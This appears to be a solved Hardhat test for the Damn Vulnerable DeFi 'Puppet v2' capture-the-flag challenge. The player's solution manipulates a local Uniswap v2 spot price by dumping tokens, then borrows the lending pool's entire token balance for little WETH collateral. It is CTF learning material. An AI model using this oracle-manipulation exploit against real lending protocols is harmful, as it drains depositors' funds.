const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
const { BigNumber } = require("ethers");

describe('[Challenge] Puppet v2', function () {
    let deployer, player;
    let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);

        // Deploy tokens to be traded
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        uniswapRouter = await UniswapRouterFactory.deploy(
            uniswapFactory.address,
            weth.address
        );

        // Create Uniswap pair against WETH and add liquidity
        await token.approve(
            uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapRouter.addLiquidityETH(
            token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        uniswapExchange = await UniswapPairFactory.attach(
            await uniswapFactory.getPair(token.address, weth.address)
        );
        expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);

        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            weth.address,
            token.address,
            uniswapExchange.address,
            uniswapFactory.address
        );

        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Check pool's been correctly setup
        expect(
            await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)
        ).to.eq(3n * 10n ** 17n);
        expect(
            await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.eq(300000n * 10n ** 18n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        async function log() {
            console.log({
                price: (await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)) / BigNumber.from(10n ** 18n),
                total: (await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)) / BigNumber.from(10n ** 18n),
            })
        }

        const lastBlock = await ethers.provider.getBlock('latest');
        const deadline = lastBlock.timestamp * 2;

        await log();
        await weth.connect(player).deposit({ value: 19n * 10n ** 18n });
        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await uniswapRouter.connect(player).swapExactTokensForETH(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1,
            [token.address, weth.address],
            player.address,
            deadline,
        );

        await log();

        const borrowAmount = 10000n * 10n ** 18n
        const collateral = await lendingPool.calculateDepositOfWETHRequired(borrowAmount)

        await weth.connect(player).deposit({ value: collateral });
        await weth.connect(player).approve(lendingPool.address, collateral);
        await lendingPool.connect(player).borrow(borrowAmount);
        await token.connect(player).approve(uniswapRouter.address, borrowAmount);
        await uniswapRouter.connect(player).swapExactTokensForETH(
            borrowAmount,
            1,
            [token.address, weth.address],
            player.address,
            deadline,
        );

        await log();

        await weth.connect(player).approve(lendingPool.address, 10n * 10n ** 18n);
        await lendingPool.connect(player).borrow(990000000000000000000000n);

        await log();
        console.log({
            x: await uniswapExchange.balanceOf(player.address) / BigNumber.from(1n * 10n ** 18n),
            y: await weth.balanceOf(player.address) / BigNumber.from(1n * 10n ** 18n),
            z: await token.balanceOf(lendingPool.address) / BigNumber.from(1n * 10n ** 18n),
            k: (await uniswapRouter.connect(player).getAmountsIn(1n * 10n ** 18n, [weth.address, token.address]))[0],
        })

        await weth.connect(player).approve(uniswapRouter.address, 1000n * 10n ** 18n);
        await weth.connect(player).withdraw(1n * 10n ** 18n);

        await uniswapRouter.connect(player).swapETHForExactTokens(
            10000n * 10n ** 18n,
            [weth.address, token.address],
            player.address,
            deadline,
            { gasLimit: 1e6, value: 1n * 10n ** 18n }
        );
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0);

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});